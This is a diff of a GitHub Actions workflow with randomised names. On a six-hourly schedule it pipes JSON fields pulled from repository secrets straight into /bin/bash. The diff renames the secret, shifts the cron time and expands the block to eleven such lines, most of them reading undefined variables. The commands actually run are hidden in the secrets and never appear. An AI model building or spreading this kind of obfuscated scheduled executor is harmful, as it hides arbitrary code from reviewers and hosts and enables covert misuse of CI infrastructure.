@@ -1,19 +1,27 @@
 name: hongqigong6725
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
-jobs:  # 18851
+    - cron: '6 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hongqigong6725
         env:
-          pp3: ${{ secrets.pp3 }}
+          rsr360: ${{ secrets.rsr360 }}
         run: |
-          echo $pp3 | jq -r .eydjm84918 | /bin/bash
-          echo $kxxvh85 | jq -r .qjavo4842 | /bin/bash
-          echo $a8 | jq -r .qvxip8 | /bin/bash
+          echo $rsr360 | jq -r .juk507 | /bin/bash
+          echo $udskv8632 | jq -r .cifva08 | /bin/bash
+          echo $pm1 | jq -r .kh5 | /bin/bash
+          echo $s435 | jq -r .qt8 | /bin/bash
+          echo $yyorh85192 | jq -r .qz434 | /bin/bash
+          echo $w770 | jq -r .zcwv4 | /bin/bash
+          echo $upudg0372 | jq -r .xhrg64 | /bin/bash
+          echo $q478 | jq -r .lu84 | /bin/bash
+          echo $ea74 | jq -r .sxee53 | /bin/bash
+          echo $jacv17988 | jq -r .ivdg018 | /bin/bash
+          echo $imkl24 | jq -r .xsziu47867 | /bin/bash
 
